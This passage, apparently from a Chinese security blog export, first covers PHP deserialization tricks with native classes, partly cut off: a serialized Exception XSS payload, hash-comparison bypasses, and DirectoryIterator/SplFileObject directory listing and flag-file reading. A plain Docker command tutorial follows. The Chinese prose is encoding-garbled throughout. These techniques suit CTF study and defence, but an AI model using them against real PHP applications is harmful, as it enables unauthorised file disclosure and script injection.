class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>file%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A52%<span class="number">3</span>A%<span class="number">22</span>D%<span class="number">3</span>A%<span class="number">5</span>C666%<span class="number">5</span>Capps%<span class="number">5</span>CPhpStorm%<span class="number">5</span>CProject%<span class="number">5</span>Cdemo%<span class="number">5</span>Cdemo_01%<span class="number">5</span>Cpoc_01.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>line%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A2%<span class="number">3</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A19%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span><span class="built_in">Exception</span>%<span class="number">00</span>previous%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><p>å°†ç»“æœä½œä¸ºå‚æ•°ä¼ è¿›å»ï¼ŒæˆåŠŸå¼¹çª—ï¼ï¼ˆexceptioné€‚ç”¨äºphp5å’Œ7,erroråªé€‚ç”¨äºphp7ï¼‰</p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/demo_01.png" alt=""></p><p><strong>Exception</strong>æ˜¯æ‰€æœ‰ç”¨æˆ·çº§å¼‚å¸¸çš„åŸºç±»ã€‚ (PHP 5, 7, 8)</p><h2 id="Error-Exception-å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ"><a href="#Error-Exception-å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ" class="headerlink" title="Error/Exception å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ"></a>Error/Exception å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ</h2><p>é€šè¿‡æ„é€ è¿™ä¸¤ä¸ªç±»å¯ä»¥å•Šç»•è¿‡md5()å’Œsha1()å‡½æ•°ã€‚errorå’Œexceptionéƒ½æœ‰ä¸€ä¸ªé‡è¦æ–¹æ³•ï¼š_tostringï¼Œç”¨äºå°†å¼‚å¸¸å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚</p><p>åŒæ ·ï¼Œå½“md5()å’Œsha1()å‡½æ•°å¤„ç†å¯¹è±¡æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨__tostringæ–¹æ³•</p><p><strong>demo</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">a = new Exception(<span class="string">&quot;payload&quot;</span>,1);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">b = new Exception(<span class="string">&quot;payload&quot;</span>,2);</span></span><br><span class="line">echo $a.&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo $b.&quot;&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡ºç»“æœ</strong></p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/demo_02.png" alt=""></p><p><strong>test</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">a = new Exception(<span class="string">&quot;payload&quot;</span>,1);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">b = new Exception(<span class="string">&quot;payload&quot;</span>,2);</span></span><br><span class="line">if ($a!==$b)&#123;</span><br><span class="line">    echo &quot;$aä¸ç­‰äº$b&quot;.&quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if (md5($a)===md5($b))&#123;</span><br><span class="line">    echo &quot;md5å€¼ç›¸ç­‰&quot;.&quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if (sha1($a)===sha1($b))&#123;</span><br><span class="line">    echo &quot;sha1å€¼ç›¸ç­‰&quot;.&quot;\n&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡ºç»“æœ</strong></p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/test_02.png" alt=""></p><p>å¯ä»¥çœ‹å‡ºï¼Œpayloadåé¢çš„å‚æ•°å¹¶ä¸å½±å“è¾“å‡ºçš„ç»“æœã€‚æ­£æ˜¯é€šè¿‡è¿™ä¸ªå¯ä»¥ç»•è¿‡å“ˆå¸Œå‡½æ•°ã€‚</p><h2 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h2><p>PHP çš„å†…ç½®ç±» SoapClient æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨æ¥è®¿é—®webæœåŠ¡çš„ç±»ï¼Œå¯ä»¥æä¾›ä¸€ä¸ªåŸºäºSOAPåè®®è®¿é—®WebæœåŠ¡çš„ PHP å®¢æˆ·ç«¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: <span class="title function_ invoke__">SoapClient</span>(<span class="keyword">mixed</span> <span class="variable">$wsd1</span> [, <span class="keyword">array</span> <span class="variable">$options</span> ])</span><br></pre></td></tr></table></figure><ul><li>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ï¼Œå°†è¯¥å€¼è®¾ä¸ºnullåˆ™è¡¨ç¤ºéwsdlæ¨¡å¼ã€‚</li><li>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚</li></ul><h2 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h2><h3 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h3><p>DirectoryIterator ç±»ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ã€‚å½“æ‰§è¡Œåˆ°echoå‡½æ•°æ—¶ï¼Œä¼šè§¦å‘DirectoryIteratorç±»ä¸­çš„ __toString() æ–¹æ³•ï¼Œè¾“å‡ºæŒ‡å®šç›®å½•é‡Œé¢ç»è¿‡æ’åºä¹‹åçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶åï¼š</p><p><strong>demo</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$b</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$b</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡ºç»“æœ</strong></p><p><img src="/img/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/demo_03.png" alt=""></p><p><strong>è¾“å‡ºæŒ‡å®šç›®å½•é‡Œé¢ç»è¿‡æ’åºä¹‹åçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶å</strong></p><p>ä½¿ç”¨æ­¤å†…ç½®ç±»çš„__toStringæ–¹æ³•ç»“åˆglobæˆ–fileåè®®ï¼Œå³å¯å®ç°ç›®å½•éå†</p><p>å¤šä¸€ä¸ªæ–œæ ï¼Œç›®å½•å¾€å‰ä¸€ä¸ªã€‚</p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥é…åˆ<strong>glob://åè®®</strong>ä½¿ç”¨<strong>æ¨¡å¼åŒ¹é…</strong>æ¥å¯»æ‰¾æˆ‘ä»¬æƒ³è¦çš„<strong>æ–‡ä»¶è·¯å¾„</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*php*&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure><p> ä¹Ÿå¯ä»¥é€šè¿‡ç›®å½•ç©¿è¶Šï¼Œç¡®å®šæˆ‘ä»¬å·²çŸ¥çš„æ–‡ä»¶çš„<strong>å…·ä½“è·¯å¾„</strong>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob://./././flag.txt&quot;</span>);  <span class="comment">//ç›®å½•ç©¿è¶Š</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure><h3 id="FilesystemIterator-ç±»"><a href="#FilesystemIterator-ç±»" class="headerlink" title="FilesystemIterator ç±»"></a>FilesystemIterator ç±»</h3><p>FilesystemIterator ç±»ä¸ DirectoryIterator ç±»ç›¸åŒï¼Œæä¾›äº†ä¸€ä¸ªç”¨äºæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç›®å½•å†…å®¹çš„ç®€å•æ¥å£ã€‚è¯¥ç±»çš„æ„é€ æ–¹æ³•å°†ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ã€‚</p><p>è¯¥ç±»çš„ä½¿ç”¨æ–¹æ³•ä¸DirectoryIterator ç±»ä¹Ÿæ˜¯åŸºæœ¬ç›¸åŒçš„ã€‚</p><h3 id="GlobIterator-ç±»"><a href="#GlobIterator-ç±»" class="headerlink" title="GlobIterator ç±»"></a>GlobIterator ç±»</h3><p><strong>GlobIterator ç±»</strong>ä¹Ÿå¯ä»¥éå†ä¸€ä¸ªæ–‡ä»¶ç›®å½•ï¼Œä½¿ç”¨æ–¹æ³•ä¸å‰ä¸¤ä¸ªç±»ä¹ŸåŸºæœ¬ç›¸ä¼¼ã€‚ä½†ä¸ä¸Šé¢ç•¥ä¸åŒçš„æ˜¯å…¶è¡Œä¸ºç±»ä¼¼äº glob()å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„ã€‚ä½¿ç”¨è¿™ä¸ªç±»ä¸éœ€è¦é¢å¤–å†™ä¸Šglob://</p><p>Directorylteratorç±» ä¸ FilesystemIterator ç±»å½“æˆ‘ä»¬ä½¿ç”¨echoå‡½æ•°è¾“å‡ºçš„æ—¶å€™ï¼Œä¼šè§¦å‘è¿™ä¸¤ä¸ªç±»ä¸­çš„ __toString() æ–¹æ³•ï¼Œè¾“å‡ºæŒ‡å®šç›®å½•é‡Œé¢ç‰¹å®šæ’åºä¹‹åçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶åã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬ä¸å¾ªç¯éå†çš„è¯æ˜¯ä¸èƒ½çœ‹åˆ°æŒ‡å®šç›®å½•é‡Œçš„å…¨éƒ¨æ–‡ä»¶çš„ã€‚è€ŒGlobIterator ç±»åœ¨ä¸€å®šç¨‹åº¦ä¸Šè§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚ç”±äº GlobIterator ç±»æ”¯æŒç›´æ¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯è¯´å‡è®¾æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªæ–‡ä»¶åçš„ä¸€éƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥ç±»çš„æ¨¡å¼åŒ¹é…æ‰¾åˆ°å…¶å®Œæ•´çš„æ–‡ä»¶åã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">GlobIterator</span>(<span class="string">&quot;f*txt&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure><h2 id="å¯è¯»å–æ–‡ä»¶ç±»"><a href="#å¯è¯»å–æ–‡ä»¶ç±»" class="headerlink" title="å¯è¯»å–æ–‡ä»¶ç±»"></a>å¯è¯»å–æ–‡ä»¶ç±»</h2><p>SplFileObject ç±»å’Œ SplFileinfoä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†ä¸€ä¸ªé«˜çº§çš„é¢å‘å¯¹è±¡çš„æ¥å£ï¼Œå¯ä»¥ç”¨äºå¯¹æ–‡ä»¶å†…å®¹çš„éå†ã€æŸ¥æ‰¾ã€æ“ä½œç­‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span>=<span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ ·ä¹Ÿåªèƒ½è¯»å–ä¸€è¡Œï¼Œè¦æƒ³å…¨éƒ¨è¯»å–çš„è¯è¿˜éœ€è¦å¯¹æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œå†…å®¹è¿›è¡Œéå†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$tmp</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$tmp</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œå½¢å¦‚ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">key</span>(<span class="variable">$this</span>-&gt;value);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span> -&gt; a = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">key</span>(<span class="variable">$this</span>-&gt;value);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰popé“¾çš„æ€è·¯å’Œå¯åˆ©ç”¨ååºåˆ—åŒ–çš„å‡½æ•°ï¼Œä¸€èˆ¬å°±æ˜¯éœ€è¦ç”¨åŸç”Ÿç±»äº†ã€‚</p><p>åªéœ€è¦è®©<strong>$this-&gt;key</strong>å€¼èµ‹ä¸ºæˆ‘ä»¬æƒ³ç”¨åŸç”Ÿå‡½æ•°ï¼Œ<strong>$this-&gt;value</strong>èµ‹ä¸ºè·¯å¾„ï¼ŒæŸ¥å°±è¡Œäº†ã€‚ä½†æ˜¯è¿™ç§æ„é€ ç±»å‹çš„æ–¹æ³•çš„å±€é™æ€§å°±æ˜¯åªèƒ½æŸ¥ä¸€ä¸ªè·¯å¾„ä¸Šçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker</title>
      <link href="/2023/07/26/Docker/"/>
      <url>/2023/07/26/Docker/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>å®˜ç½‘ï¼š<a href="https://www.docker.com/">Docker</a></p><p>æ–‡æ¡£åœ°å€ï¼š<a href="https://docs.docker.com/">Docker Docs</a></p><p>ä»“åº“åœ°å€ï¼š<a href="https://hub-stage.docker.com/">Docker Hub</a><br>                    <a href="https://dashboard.daocloud.io/">DaoCloud</a></p><p>Dockeræ˜¯åŸºäºGoè¯­è¨€å¼€å‘çš„å¼€æºé¡¹ç›®ï¼</p><h2 id="Dockerçš„åŸºæœ¬ç»„æˆ"><a href="#Dockerçš„åŸºæœ¬ç»„æˆ" class="headerlink" title="Dockerçš„åŸºæœ¬ç»„æˆ"></a>Dockerçš„åŸºæœ¬ç»„æˆ</h2><p><strong>é•œåƒï¼ˆimageï¼‰ï¼š</strong></p><p>Dockeré•œåƒå°±å¥½æ¯”æ˜¯ä¸€ä¸ªæ¨¡æ¿ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ¨¡æ¿æ¥åˆ›å»ºå®¹å™¨æœåŠ¡ï¼Œé€šè¿‡è¿™ä¸ªé•œåƒå¯ä»¥åˆ›å»ºå¤šä¸ªå®¹å™¨ï¼ˆæœ€ç»ˆæœåŠ¡è¿è¡Œæˆ–è€…é¡¹ç›®è¿è¡Œå°±æ˜¯åœ¨å®¹å™¨ä¸­çš„ï¼‰</p><p><strong>å®¹å™¨ï¼ˆcontainerï¼‰ï¼š</strong></p><p>Dockeråˆ©ç”¨å®¹å™¨æŠ€æœ¯ï¼Œç‹¬ç«‹è¿è¡Œä¸€ä¸ªæˆ–è€…ä¸€ä¸ªç»„åº”ç”¨ï¼Œé€šè¿‡è¿™ä¸ªé•œåƒæ¥åˆ›å»ºçš„</p><p>å¯åŠ¨ï¼Œåœæ­¢ï¼Œåˆ é™¤ï¼ŒåŸºæœ¬å‘½ä»¤</p><p>å¯ä»¥æŠŠè¿™ä¸ªå®¹å™¨ç†è§£ä¸ºå°±æ˜¯ä¸€ä¸ªç®€æ˜“çš„linuxç³»ç»Ÿ</p><p><strong>ä»“åº“ï¼ˆrepositoryï¼‰ï¼š</strong></p><p>ä»“åº“å°±æ˜¯å­˜æ”¾é•œåƒçš„åœ°æ–¹</p><p>ä»“åº“åˆ†ä¸ºå…¬æœ‰ä»“åº“å’Œç§æœ‰ä»“åº“</p><h2 id="Runæµç¨‹"><a href="#Runæµç¨‹" class="headerlink" title="Runæµç¨‹"></a>Runæµç¨‹</h2><p><img src="/img/Docker/1.png" alt=""></p><h1 id="Dockerçš„å¸¸ç”¨å‘½ä»¤"><a href="#Dockerçš„å¸¸ç”¨å‘½ä»¤" class="headerlink" title="Dockerçš„å¸¸ç”¨å‘½ä»¤"></a>Dockerçš„å¸¸ç”¨å‘½ä»¤</h1><h2 id="å¸®åŠ©å‘½ä»¤"><a href="#å¸®åŠ©å‘½ä»¤" class="headerlink" title="å¸®åŠ©å‘½ä»¤"></a>å¸®åŠ©å‘½ä»¤</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker version#æ˜¾ç¤ºdockerçš„ç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">docker info#æ˜¾ç¤º</span><br><span class="line">docker å‘½ä»¤ --help#ä¸‡èƒ½å‘½ä»¤</span><br></pre></td></tr></table></figure><p>å¸®åŠ©æ–‡æ¡£çš„åœ°å€ï¼š<a href="https://docs.docker.com/reference/">Reference</a></p><h2 id="é•œåƒå‘½ä»¤"><a href="#é•œåƒå‘½ä»¤" class="headerlink" title="é•œåƒå‘½ä»¤"></a>é•œåƒå‘½ä»¤</h2><p><strong>docker images</strong> æŸ¥çœ‹æ‰€æœ‰æœ¬åœ°çš„ä¸»æœºä¸Šçš„é•œåƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@lemon-virtual-machine:/# docker images</span><br><span class="line">REPOSITORY    TAG       IMAGE ID       CREATED        SIZE</span><br><span class="line">hello-world   latest    9c7a54a9a43c   2 months ago   13.3kB</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è§£é‡Š</span></span><br><span class="line">REPOSITORY  # é•œåƒçš„ä»“åº“æº</span><br><span class="line">TAG# é•œåƒçš„æ ‡ç­¾</span><br><span class="line">IMAGE ID# é•œåƒçš„id</span><br><span class="line">CREATED# é•œåƒçš„åˆ›å»ºæ—¶é—´</span><br><span class="line">SIZE# é•œåƒçš„å¤§å°</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¯é€‰é¡¹</span></span><br><span class="line">  -a, --all             # åˆ—å‡ºæ‰€æœ‰é•œåƒ</span><br><span class="line">  -q, --quiet           # åªæ˜¾ç¤ºé•œåƒçš„id</span><br></pre></td></tr></table></figure><p><strong>docker search</strong> æœç´¢é•œåƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@lemon-virtual-machine:/# docker search mysql</span><br><span class="line">NAME                            DESCRIPTION                                      STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql                           MySQL is a widely used, open-source relationâ€¦   14316     [OK]       </span><br><span class="line">mariadb                         MariaDB Server is a high performing open souâ€¦   5465      [OK]       </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¯é€‰é¡¹ï¼Œé€šè¿‡æœç´¢æ¥è¿‡æ»¤</span></span><br><span class="line"> --filter=STARS=3000# æœç´¢å‡ºæ¥çš„é•œåƒå°±æ˜¯STARSå¤§äº3000çš„</span><br><span class="line">root@lemon-virtual-machine:/# docker search mysql --filter=STARS=3000</span><br><span class="line">NAME      DESCRIPTION                                      STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql     MySQL is a widely used, open-source relationâ€¦   14316     [OK]       </span><br><span class="line">mariadb   MariaDB Server is a high performing open souâ€¦   5465      [OK]    </span><br></pre></td></tr></table></figure><p><strong>docker pull</strong> ä¸‹è½½é•œåƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ä¸‹è½½é•œåƒ docker pull é•œåƒå[:tag]</span></span><br><span class="line">root@lemon-virtual-machine:/# docker pull mysql</span><br><span class="line">Using default tag: latest# å¦‚æœä¸å†™tagï¼Œé»˜è®¤å°±æ˜¯latest</span><br><span class="line">latest: Pulling from library/mysql </span><br><span class="line">72a69066d2fe: Pull complete# åˆ†å±‚ä¸‹è½½ï¼Œdocker imageçš„æ ¸å¿ƒ è”åˆæ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line">93619dbc5b36: Pull complete </span><br><span class="line">99da31dd6142: Pull complete </span><br><span class="line">626033c43d70: Pull complete </span><br><span class="line">37d5d7efb64e: Pull complete </span><br><span class="line">ac563158d721: Pull complete </span><br><span class="line">d2ba16033dad: Pull complete </span><br><span class="line">688ba7d5c01a: Pull complete </span><br><span class="line">00e060b6d11d: Pull complete </span><br><span class="line">1c04857f594f: Pull complete </span><br><span class="line">4d7cfa90e6ea: Pull complete </span><br><span class="line">e0431212d27d: Pull complete </span><br><span class="line">Digest: sha256:e9027fe4d91c0153429607251656806cc784e914937271037f7738bd5b8e7709# ç­¾å</span><br><span class="line">Status: Downloaded newer image for mysql:latest</span><br><span class="line">docker.io/library/mysql:latest # çœŸå®åœ°å€</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ç­‰ä»·</span></span><br><span class="line">docker pull mysql</span><br><span class="line">docker pull docker.io/library/mysql:latest</span><br></pre></td></tr></table></figure><p><strong>docker rmi</strong> åˆ é™¤é•œåƒ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@lemon-virtual-machine:/# docker rmi -f é•œåƒid# åˆ é™¤æŒ‡å®šé•œåƒ</span><br><span class="line">root@lemon-virtual-machine:/# docker rmi -f é•œåƒid é•œåƒid é•œåƒid# åˆ é™¤å¤šä¸ªé•œåƒ</span><br><span class="line">root@lemon-virtual-machine:/# docker rmi -f $(docker images -aq)# åˆ é™¤å…¨éƒ¨çš„é•œåƒ</span><br></pre></td></tr></table></figure><h2 id="å®¹å™¨å‘½ä»¤"><a href="#å®¹å™¨å‘½ä»¤" class="headerlink" title="å®¹å™¨å‘½ä»¤"></a>å®¹å™¨å‘½ä»¤</h2><p><strong>è¯´æ˜ï¼šæˆ‘ä»¬æœ‰äº†é•œåƒæ‰å¯ä»¥åˆ›å»ºå®¹å™¨ï¼Œlinuxï¼Œä¸‹è½½ä¸€ä¸ªcentosé•œåƒæ¥æµ‹è¯•å­¦ä¹ </strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull centos</span><br></pre></td></tr></table></figure><p><strong>æ–°å»ºå®¹å™¨å¹¶å¯åŠ¨</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">docker run [å¯é€‰å‚æ•°] image</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å‚æ•°è¯´æ˜</span></span><br><span class="line">--name=&quot;Name&quot;# å®¹å™¨åå­— 